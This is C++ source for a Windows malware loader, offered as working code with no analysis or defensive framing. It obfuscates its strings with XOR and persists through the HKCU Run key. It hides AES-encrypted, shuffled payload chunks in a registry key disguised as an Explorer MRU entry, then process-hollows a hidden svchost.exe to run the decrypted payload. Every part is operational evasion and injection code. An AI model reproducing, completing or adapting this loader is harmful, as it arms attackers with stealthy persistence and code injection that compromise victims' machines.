#include <windows.h>
#include <cstdint>
#include <vector>
#include <wincrypt.h>
#include <cstdio>
#include <random>  
#include <string>
#include <algorithm>
#pragma comment(lib, "advapi32.lib")
#define MVAL     0x474E5089
// #define AesSKEY  ((uint8_t)(MVAL & 0xFF)) 

#pragma pack(push, 1)
struct PIndex {
    uint32_t mval = MVAL;
    uint8_t  fkey;
    uint32_t tsize;
    uint16_t ccount;
    uint16_t fchkid;
    uint32_t crc32;
    uint16_t shseed;
};
#pragma pack(pop)
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

template<typename T = wchar_t>
std::basic_string<T> RuntimeDecrypt(const T* encryptedData, size_t length, T xorKey) {
    std::basic_string<T> decrypted;
    decrypted.reserve(length);
    for (size_t i = 0; i < length; ++i) {
        decrypted += encryptedData[i] ^ xorKey;
    }
    return decrypted;
}
static const wchar_t encRunKeyPath[] = {
    0xF8^0xAA, 0xE5^0xAA, 0xE0^0xAA, 0xF4^0xAA, 0xE6^0xAA, 0xE0^0xAA, 0xFC^0xAA, 0xE4^0xAA, 0x07^0xAA,  // Software
    0xE6^0xAA, 0xE2^0xAA, 0xE8^0xAA, 0xFC^0xAA, 0xE5^0xAA, 0xF2^0xAA, 0xE5^0xAA, 0xE0^0xAA, 0xF4^0xAA, 0x07^0xAA,  // Microsoft
    0xE6^0xAA, 0xE2^0xAA, 0xEE^0xAA, 0xE3^0xAA, 0xE5^0xAA, 0xE6^0xAA, 0xF2^0xAA, 0x07^0xAA,                          // Windows
    0xE8^0xAA, 0xF8^0xAA, 0xFC^0xAA, 0xFC^0xAA, 0xE4^0xAA, 0xEE^0xAA, 0xF4^0xAA, 0xF1^0xAA, 0xE4^0xAA, 0xFC^0xAA, 0xF2^0xAA, 0xE2^0xAA, 0xE5^0xAA, 0xEE^0xAA, 0x07^0xAA,  // CurrentVersion
    0xFC^0xAA, 0xF8^0xAA, 0xEE^0xAA, 0x00                                                                                     // Run\0
};
static const wchar_t encRunValueName[] = {
    0xE6^0xBB, 0xE2^0xBB, 0xEE^0xBB, 0xE3^0xBB, 0xE5^0xBB, 0xE6^0xBB, 0xF2^0xBB, 0xF8^0xBB, 0xF0^0xBB, 0xE3^0xBB, 0xE0^0xBB, 0xF4^0xBB, 0xE4^0xBB, 0xE7^0xBB, 0xE4^0xBB, 0xE9^0xBB, 0xF0^0xBB, 0xE4^0xBB, 0xFC^0xBB, 0x00
};

static const wchar_t encCidPath[] = {
    0xF8^0xCC, 0xE5^0xCC, 0xE0^0xCC, 0xF4^0xCC, 0xE6^0xCC, 0xE0^0xCC, 0xFC^0xCC, 0xE4^0xCC, 0x07^0xCC,  // Software
    0xE6^0xCC, 0xE2^0xCC, 0xE8^0xCC, 0xFC^0xCC, 0xE5^0xCC, 0xF2^0xCC, 0xE5^0xCC, 0xE0^0xCC, 0xF4^0xCC, 0x07^0xCC,  // Microsoft
    0xE6^0xCC, 0xE2^0xCC, 0xEE^0xCC, 0xE3^0xCC, 0xE5^0xCC, 0xE6^0xCC, 0xF2^0xCC, 0x07^0xCC,                          // Windows
    0xE8^0xCC, 0xF8^0xCC, 0xFC^0xCC, 0xFC^0xCC, 0xE4^0xCC, 0xEE^0xCC, 0xF4^0xCC, 0xF1^0xCC, 0xE4^0xCC, 0xFC^0xCC, 0xF2^0xCC, 0xE2^0xCC, 0xE5^0xCC, 0xEE^0xCC, 0x07^0xCC,  // CurrentVersion
    0xE4^0xCC, 0xFD^0xCC, 0xF0^0xCC, 0xE9^0xCC, 0xE5^0xCC, 0xFC^0xCC, 0xE4^0xCC, 0xFC^0xCC, 0x07^0xCC,                          // Explorer
    0xE8^0xCC, 0xE5^0xCC, 0xE6^0xCC, 0xE9^0xCC, 0xE9^0xCC, 0xE3^0xCC, 0xE9^0xCC, 0xE7^0xCC, 0x3A^0xCC, 0x07^0xCC,              // ComDlg32
    0xE8^0xCC, 0xE2^0xCC, 0xE3^0xCC, 0xF2^0xCC, 0xE2^0xCC, 0xFA^0xCC, 0xE4^0xCC, 0xE6^0xCC, 0xF8^0xCC, 0xF8^0xCC, 0x00        // CIDSizeMRU
};

static const wchar_t encExplorerName[] = {
    0xE4^0xDD, 0xFD^0xDD, 0xF0^0xDD, 0xE9^0xDD, 0xE5^0xDD, 0xFC^0xDD, 0xE4^0xDD, 0xFC^0xDD, 0x3A^0xDD, 0xE4^0xDD, 0xFD^0xDD, 0xE4^0xDD, 0x00
};

static const wchar_t encItemPrefix[] = {
    0xE2^0xEE, 0xF4^0xEE, 0xE4^0xEE, 0xE6^0xEE, 0x00
};

static const char encSvchostPath[] = {
    'C'^0x99, ':'^0x99, '\\'^0x99,
    'W'^0x99, 'i'^0x99, 'n'^0x99, 'd'^0x99, 'o'^0x99, 'w'^0x99, 's'^0x99, '\\'^0x99,
    'S'^0x99, 'y'^0x99, 's'^0x99, 't'^0x99, 'e'^0x99, 'm'^0x99, '3'^0x99, '2'^0x99, '\\'^0x99,
    's'^0x99, 'v'^0x99, 'c'^0x99, 'h'^0x99, 'o'^0x99, 's'^0x99, 't'^0x99, '.'^0x99, 'e'^0x99, 'x'^0x99, 'e'^0x99,
    0^0x99
};
unsigned char* LoadResBID(int id, DWORD* size) {
    HMODULE hMod = GetModuleHandle(NULL);
    
    // XOR-encrypted "RCDATA" string
    static const unsigned char encResType[] = {
        0x52 ^ 0xAA,  // 'R' ^ 0xAA = 0xF8
        0x43 ^ 0xAA,  // 'C' ^ 0xAA = 0xE9
        0x44 ^ 0xAA,  // 'D' ^ 0xAA = 0xEE
        0x41 ^ 0xAA,  // 'A' ^ 0xAA = 0xEB
        0x54 ^ 0xAA,  // 'T' ^ 0xAA = 0xFE
        0x41 ^ 0xAA,  // 'A' ^ 0xAA = 0xEB
        0x00 ^ 0xAA   // '\0' ^ 0xAA = 0xAA
    };
    
    // Decrypt at runtime
    char resType[7];
    for (int i = 0; i < 7; i++) {
        resType[i] = encResType[i] ^ 0xAA;
    }
    
    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), resType);
    if (!hRes) return nullptr;
    
    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) return nullptr;
    *size = SizeofResource(hMod, hRes);
    return (unsigned char*)LockResource(hGlob);
}

uint32_t CalCR32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

bool VerPay(const std::vector<char>& pbuf, uint32_t ecrc, uint32_t esize) {
    if (pbuf.size() != esize) { 
        return false; 
    }
    if (CalCR32(pbuf.data(), pbuf.size()) != ecrc) { 
        return false; 
    }
    return true;
}

bool IsInAuto() {
    HKEY hKey;
    wchar_t modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
   
    std::wstring runPath = RuntimeDecrypt<wchar_t>(encRunKeyPath, ARRAYSIZE(encRunKeyPath)-1, 0xAA);
    std::wstring valName = RuntimeDecrypt<wchar_t>(encRunValueName, ARRAYSIZE(encRunValueName)-1, 0xBB);  // ← ADD THIS

    if (RegOpenKeyExW(HKEY_CURRENT_USER, runPath.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        wchar_t regPath[MAX_PATH];
        DWORD size = sizeof(regPath);
        bool found = false;
      
        if (RegQueryValueExW(hKey, valName.c_str(), NULL, NULL,  // ← CHANGE HERE
                            (LPBYTE)regPath, &size) == ERROR_SUCCESS) {
            found = (wcsstr(regPath, modulePath) != NULL);
        }
      
        RegCloseKey(hKey);
        return found;
    }
    return false;
}
bool AddToAuto() {
    if (IsInAuto()) {
        return true;
    }
   
    wchar_t modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
   
    std::wstring runPath = RuntimeDecrypt<wchar_t>(encRunKeyPath, ARRAYSIZE(encRunKeyPath)-1, 0xAA);
    std::wstring valName = RuntimeDecrypt<wchar_t>(encRunValueName, ARRAYSIZE(encRunValueName)-1, 0xBB);  // ← ADD THIS

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, runPath.c_str(), 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        std::wstring value = L"\"" + std::wstring(modulePath) + L"\"";
        BOOL success = (RegSetValueExW(hKey, valName.c_str(), 0, REG_SZ,  // ← CHANGE HERE
            (BYTE*)value.c_str(),
            (DWORD)(value.length() * sizeof(wchar_t))) == ERROR_SUCCESS);
      
        RegCloseKey(hKey);
        return success;
    }
    return false;
}
bool RegFE() {
    std::wstring cidPath = RuntimeDecrypt<wchar_t>(encCidPath, ARRAYSIZE(encCidPath)-1, (wchar_t)0xCC);
    std::wstring expName = RuntimeDecrypt<wchar_t>(encExplorerName, ARRAYSIZE(encExplorerName)-1, (wchar_t)0xDD);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    DWORD size = 0;
    bool exists = (RegQueryValueExW(hKey, expName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
   
    RegCloseKey(hKey);
    return exists;
}

bool StoreFIR(const PIndex& index, const std::vector<std::vector<BYTE>>& eChks) {
    std::wstring cidPath = RuntimeDecrypt<wchar_t>(encCidPath, ARRAYSIZE(encCidPath)-1, (wchar_t)0xCC);
    std::wstring expName = RuntimeDecrypt<wchar_t>(encExplorerName, ARRAYSIZE(encExplorerName)-1, (wchar_t)0xDD);
    std::wstring itemPrefix = RuntimeDecrypt<wchar_t>(encItemPrefix, ARRAYSIZE(encItemPrefix)-1, (wchar_t)0xEE);

    HKEY hKey;
    DWORD disposition;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS) {
        return false;
    }
    if (RegSetValueExW(hKey, expName.c_str(), 0, REG_BINARY, (BYTE*)&index, sizeof(PIndex)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }
    for (size_t i = 0; i < eChks.size(); ++i) {
        std::wstring chunkName = itemPrefix + std::to_wstring(i);
        if (RegSetValueExW(hKey, chunkName.c_str(), 0, REG_BINARY, eChks[i].data(), (DWORD)eChks[i].size()) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return false;
        }
    }
    RegCloseKey(hKey);
    return true;
}
std::vector<char> LoadFFR() {
    std::wstring cidPath = RuntimeDecrypt<wchar_t>(encCidPath, ARRAYSIZE(encCidPath)-1, (wchar_t)0xCC);
    std::wstring expName = RuntimeDecrypt<wchar_t>(encExplorerName, ARRAYSIZE(encExplorerName)-1, (wchar_t)0xDD);
    std::wstring itemPrefix = RuntimeDecrypt<wchar_t>(encItemPrefix, ARRAYSIZE(encItemPrefix)-1, (wchar_t)0xEE);

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, cidPath.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return {};
    }
   
    DWORD size = sizeof(PIndex);
    PIndex index;
   
    if (RegQueryValueExW(hKey, expName.c_str(), NULL, NULL, (BYTE*)&index, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return {};
    }
    
   if (index.mval != MVAL) {
        RegCloseKey(hKey);
        return {};
    }
    
   
    std::vector<std::vector<BYTE>> shuffledEncryptedChunks(index.ccount);
    for (int i = 0; i < index.ccount; ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        DWORD chunkSize = 0;
        
        if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, NULL, &chunkSize) == ERROR_SUCCESS) {
            shuffledEncryptedChunks[i].resize(chunkSize);
            if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, shuffledEncryptedChunks[i].data(), &chunkSize) != ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return {};
            }
        } else {
            RegCloseKey(hKey);
            return {};
        }
    }
    
    RegCloseKey(hKey);
    
    if (shuffledEncryptedChunks.size() != index.ccount) {
        return {};
    }
    
   
    std::vector<int> chunk_order(index.ccount);
    for (int i = 0; i < index.ccount; ++i) {
        chunk_order[i] = i;
    }
    
    std::mt19937 rng(index.shseed);
    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
    
    char shuffle_info[512];
   
    std::vector<std::vector<BYTE>> eChks(index.ccount);
    for (int registry_pos = 0; registry_pos < index.ccount; ++registry_pos) {
        int logical_idx = chunk_order[registry_pos];
        
        if (registry_pos < shuffledEncryptedChunks.size()) {
            eChks[logical_idx] = std::move(shuffledEncryptedChunks[registry_pos]);
            
            char buf[256];
        } else {
            return {};
        }
    }

    char buf[512];
    std::vector<char> pbuf;
    pbuf.reserve(index.tsize + 1024);

    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return {};
    }

    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
    BYTE last_cipher_block[16] = {0};

    for (int i = 0; i < index.ccount; ++i) {
        if (i >= eChks.size()) {
            CryptReleaseContext(hProv, 0);
            return {};
        }

        const auto& encrypted_data = eChks[i];
        DWORD chunk_size = (DWORD)encrypted_data.size();

       
        BYTE iv[16] = {0};
        if (i > 0) {
            memcpy(iv, last_cipher_block, 16);
        }

        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};

        keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize    = 32;
        memcpy(keyblob.key, aes_key, 32);

        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            CryptReleaseContext(hProv, 0);
            return {};
        }

        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

       
        std::vector<BYTE> decbuf(chunk_size);
        memcpy(decbuf.data(), encrypted_data.data(), chunk_size);
        DWORD out_len = chunk_size;

        if (!CryptDecrypt(hKey, 0, FALSE, 0, decbuf.data(), &out_len)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

        CryptDestroyKey(hKey);

        if (chunk_size >= 16) {
            memcpy(last_cipher_block, encrypted_data.data() + chunk_size - 16, 16);
        } else {
            memcpy(last_cipher_block, encrypted_data.data(), chunk_size);
            memset(last_cipher_block + chunk_size, 0, 16 - chunk_size);
        }

        if (out_len > 0) {
            BYTE pad = decbuf[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (decbuf[out_len - 1 - j] != pad) {
                        valid = false;
                        break;
                    }
                }
                if (valid) {
                    out_len -= pad;
                }
            }
        }

        pbuf.insert(pbuf.end(), (char*)decbuf.data(), (char*)decbuf.data() + out_len);
        
    }

    CryptReleaseContext(hProv, 0);

    if (!VerPay(pbuf, index.crc32, index.tsize)) {
        return {};
    }
    return pbuf;
}


std::pair<PIndex, std::vector<std::vector<BYTE>>> LoadEFR() {
    DWORD iSize = 0;
    unsigned char* idata = LoadResBID(999, &iSize);
    if (!idata || iSize < sizeof(PIndex)) {
        return {};
    }

    PIndex* idx = (PIndex*)idata;
    if (idx->mval != MVAL) {
        return {};
    }

    std::vector<std::vector<BYTE>> shEChks;
    for (int respos = 0; respos < idx->ccount; ++respos) {
        int resId = idx->fchkid + respos;
        
        DWORD chksize = 0;
        unsigned char* encbuf = LoadResBID(resId, &chksize);
        
        if (encbuf && chksize > 0) {
            std::vector<BYTE> chunk(encbuf, encbuf + chksize);
            shEChks.push_back(chunk);
            
            char buf[256];
       
        } else {
            char buf[256];

            return {};
        }
    }

    if (shEChks.size() != idx->ccount) {
        return {};
    }
    
    std::vector<int> chkOrdr(idx->ccount);
    for (int i = 0; i < idx->ccount; ++i) {
        chkOrdr[i] = i;
    }
    
    std::mt19937 rng(idx->shseed);
    std::shuffle(chkOrdr.begin(), chkOrdr.end(), rng);
    
  
    char shuffle_info[512];

    
    std::vector<std::vector<BYTE>> eChks(idx->ccount);

for (int r_pos = 0; r_pos < idx->ccount; ++r_pos) {
    int log_idx = chkOrdr[r_pos];

    if (r_pos < shEChks.size()) {
       eChks[log_idx] = std::move(shEChks[r_pos]);

        char buf[256];
    } else {  
        return {};
    }
}

    
    return {*idx, eChks};
}
std::vector<char> RecFWRP() {
    if (!IsInAuto()) {
        AddToAuto();
    }
    
    if (RegFE()) {
      
        auto rPBuf = LoadFFR();
        if (!rPBuf.empty()) {
          
            return rPBuf;
        }
     
    }
    
   
    auto [index, enChksLog] = LoadEFR();   
    if (!enChksLog.empty()) {
        std::vector<int>chkOrdr(index.ccount);
        for (int i = 0; i < index.ccount; ++i) {
           chkOrdr[i] = i;
        }
        
        std::mt19937 rng(index.shseed);
        std::shuffle(chkOrdr.begin(),chkOrdr.end(), rng);
        std::vector<int> inv_ord(index.ccount);
        for (int regpos = 0; regpos < index.ccount; ++regpos) {
            int log_idx = chkOrdr[regpos];
            inv_ord[log_idx] = regpos;
        }
        
        std::vector<std::vector<BYTE>> encChksShuf(index.ccount);
        for (int log_idx = 0; log_idx < index.ccount; ++log_idx) {
            int reg_pos =  inv_ord[log_idx];
            encChksShuf[reg_pos] = enChksLog[log_idx];
            char buf[256];
        }
        
        StoreFIR(index, encChksShuf);
       
        char buf[512];
        std::vector<char> pbuf;
        pbuf.reserve(index.tsize + 1024);

        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
          
            return {};
        }

        BYTE aes_key[32] = {0};
        for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
        BYTE last_cipher_block[16] = {0};

        for (int i = 0; i < index.ccount; ++i) {
            const auto& enc_buf = enChksLog[i];
            DWORD chk_s = (DWORD)enc_buf.size();
           
            BYTE iv[16] = {0};
            if (i > 0) {
                memcpy(iv, last_cipher_block, 16);
            }

            struct {
                BLOBHEADER hdr;
                DWORD      dwKeySize;
                BYTE       key[32];
            } keyblob = {0};

            keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
            keyblob.hdr.bVersion = CUR_BLOB_VERSION;
            keyblob.hdr.reserved = 0;
            keyblob.hdr.aiKeyAlg = CALG_AES_256;
            keyblob.dwKeySize    = 32;
            memcpy(keyblob.key, aes_key, 32);

            HCRYPTKEY hKey = 0;
            if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
                CryptReleaseContext(hProv, 0);
                return {};
            }

            if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return {};
            }

            std::vector<BYTE> dec(chk_s);
            memcpy(dec.data(), enc_buf.data(), chk_s);
            DWORD out_len = chk_s;

            if (!CryptDecrypt(hKey, 0, FALSE, 0, dec.data(), &out_len)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return {};
            }

            CryptDestroyKey(hKey);

            if (chk_s >= 16) {
                memcpy(last_cipher_block, enc_buf.data() + chk_s - 16, 16);
            }

            if (out_len > 0) {
                BYTE pad = dec[out_len - 1];
                if (pad >= 1 && pad <= 16) {
                    bool valid = true;
                    for (int j = 0; j < pad; ++j) {
                        if (dec[out_len - 1 - j] != pad) {
                            valid = false;
                            break;
                        }
                    }
                    if (valid) {
                        out_len -= pad;
                    }
                }
            }

            pbuf.insert(pbuf.end(), (char*)dec.data(), (char*)dec.data() + out_len);
        }

        CryptReleaseContext(hProv, 0);

        if (VerPay(pbuf, index.crc32, index.tsize)) {
            return pbuf;
        }
    }
    
    return {};
}

bool Start(char* payload, uint32_t payloadSize) {

    

    // Parse PE headers
    BYTE* pe = (BYTE*)payload;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    
    // Check if e_lfanew is valid
    if (dos->e_lfanew < sizeof(IMAGE_DOS_HEADER) || dos->e_lfanew > payloadSize - sizeof(IMAGE_NT_HEADERS64)) {
       
        return false;
    }
    
    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);

    if (nt->Signature != IMAGE_NT_SIGNATURE) {
       
        return false;
    }

    // Create suspended target process (notepad.exe)
        PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };

    // Decrypt the base svchost path
    std::string basePath = RuntimeDecrypt<char>(
        reinterpret_cast<const char*>(encSvchostPath),
        ARRAYSIZE(encSvchostPath) - 1,
        (char)0x99
    );

    // Append the required parameter: " -k netsvcs" (most common and reliable)
    std::string fullCmdLine = basePath + " -k netsvcs";

    char* cmdLine = fullCmdLine.data();

    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }

    // Prepare to modify thread context
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER | CONTEXT_CONTROL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Attempt to allocate memory at original ImageBase first
    LPVOID remoteImage = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // Fallback: allocate anywhere if base is already taken
    if (!remoteImage) {
        remoteImage = VirtualAllocEx(pi.hProcess, NULL,
            nt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (!remoteImage) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        // Adjust ImageBase in PE headers
        nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
    }

    ULONGLONG originalImageBase = nt->OptionalHeader.ImageBase;
    ULONGLONG delta = (ULONGLONG)remoteImage - originalImageBase;

    if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(pe + relocDir.VirtualAddress);
        SIZE_T processed = 0;

        while (processed < relocDir.Size) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* relocData = (WORD*)(reloc + 1);

            for (DWORD i = 0; i < count; ++i) {
                DWORD type = relocData[i] >> 12;
                DWORD offset = relocData[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* patchAddr = (ULONGLONG*)(pe + reloc->VirtualAddress + offset);
                    *patchAddr += delta;
                }
            }

            processed += reloc->SizeOfBlock;
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }

        // Set the new base AFTER relocations
        nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;
    }

    // Write headers
    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteImage, pe, nt->OptionalHeader.SizeOfHeaders, &written)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Write sections
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        LPVOID dest = (BYTE*)remoteImage + sections[i].VirtualAddress;
        LPVOID src = pe + sections[i].PointerToRawData;
        SIZE_T sectionSize = std::max(sections[i].SizeOfRawData, sections[i].Misc.VirtualSize);

        // Ensure we don't read beyond payload bounds
        if ((BYTE*)src + sections[i].SizeOfRawData > (BYTE*)payload + payloadSize) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        BYTE* padded = new BYTE[sectionSize];
        ZeroMemory(padded, sectionSize);
        memcpy(padded, src, sections[i].SizeOfRawData);

        if (!WriteProcessMemory(pi.hProcess, dest, padded, sectionSize, &written)) {
            delete[] padded;
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
        delete[] padded;
    }

    // PEB update – dynamic resolve
    using pNtQuery = NTSTATUS(NTAPI*)(HANDLE, int, PVOID, ULONG, PULONG);
    static pNtQuery pNt = nullptr;
    if (!pNt) {
        pNt = (pNtQuery)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        if (!pNt) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    }

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG returnLength = 0;
    if (pNt(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength) != 0) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    PVOID pebBase = (BYTE*)pbi.PebBaseAddress + 0x10;
    WriteProcessMemory(pi.hProcess, pebBase, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);
    
    // Set RIP to new PE entry point
    ctx.Rip = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    // Flush instruction cache and resume
    FlushInstructionCache(pi.hProcess, remoteImage, nt->OptionalHeader.SizeOfImage);

    Sleep(100);  // Brief pause
    HWND hWnd = GetTopWindow(NULL);
    while (hWnd) {
        DWORD pid;
        GetWindowThreadProcessId(hWnd, &pid);
        if (pid == pi.dwProcessId) {
            ShowWindow(hWnd, SW_HIDE);
            ShowWindow(hWnd, SW_MINIMIZE);
            break;
        }
        hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
    }
    ResumeThread(pi.hThread);

    // Clean up handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return true;
}


int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    auto pbuf = RecFWRP();
    if (pbuf.empty()) {
        return -1;
    }
  
    if (!Start(pbuf.data(), (uint32_t)pbuf.size())) {
        return -1;
    }
    return 0;
}